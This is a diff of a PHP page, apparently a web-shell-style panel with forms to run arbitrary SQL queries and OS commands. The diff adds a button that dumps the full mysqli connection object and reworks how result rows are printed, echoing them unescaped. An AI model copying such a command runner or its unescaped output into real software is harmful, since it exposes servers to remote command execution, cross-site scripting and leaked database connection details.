@@ -43,6 +43,9 @@
         <textarea name="sql" cols="50" rows="5" placeholder="query"><?php if(!empty($action))echo $sql ?></textarea><br>
         <input type="button" value="Submit SQL" onclick="setForm('sql');">
         <input type="button" value="Run CMD" onclick="setForm('cmd');">
+        <?php if($action=="sql")
+            echo '<button type="button" data-toggle="collapse" data-target="#collapseRemote" aria-expanded="false" aria-controls="collapseRemote">mysqli Object</button>';
+        ?>
     </form>
     <script>
         function setForm(_value){
@@ -51,33 +54,38 @@
         }
     </script>
     <div class="result" style="color:black;">
-       <?php
+        <?php
             if($action=="cmd"){
                 echo "<pre>";
                 print_r($outputExec);
                 echo "</pre>";
             }
-        else if($action=="sql"&&!$result){
-            echo "<pre>";
-            print_r($conn->error);
-            echo "</pre>";
-        }else if($action=="sql"){
-                echo "<table border=\"1\">";
-                $names = $result->fetch_assoc();
-                    echo "<tr>";
-                    foreach($names as $key => $value)
-                        echo "<th>$key</th>";
-                    echo "</tr><tr>";
-                    foreach($names as $value)
-                        echo "<td>$value</td>";
-                    echo "<tr>";
-                while($rows = $result->fetch_assoc()){
-                    echo "<tr>";
-                    foreach($rows as $value)
-                        echo "<td>$value</td>";
-                    echo "<tr>";
+            else if($action=="sql"){
+                echo'<div class="collapse" id="collapseRemote" style="position:absolute;">';
+                echo '<div class="card card-body objectRemote" id="text">
+                <pre>';
+                print_r($conn);
+                echo "</pre>
+                </div>
+                    </div>";
+                if(gettype($result)!="boolean"){
+                    echo "<table border=\"1\">";
+                    $names = $result->fetch_assoc();
+                        echo "<tr>";
+                        foreach($names as $key => $value)
+                            echo "<th>$key</th>";
+                        echo "</tr><tr>";
+                        foreach($names as $value)
+                            echo "<td>$value</td>";
+                        echo "<tr>";
+                    while($rows = $result->fetch_assoc()){
+                        echo "<tr>";
+                        foreach($rows as $value)
+                            echo "<td>$value</td>";
+                        echo "<tr>";
+                    }
+                    echo "</table>";
                 }
-                echo "</table>";
             }
         ?>
     </div>
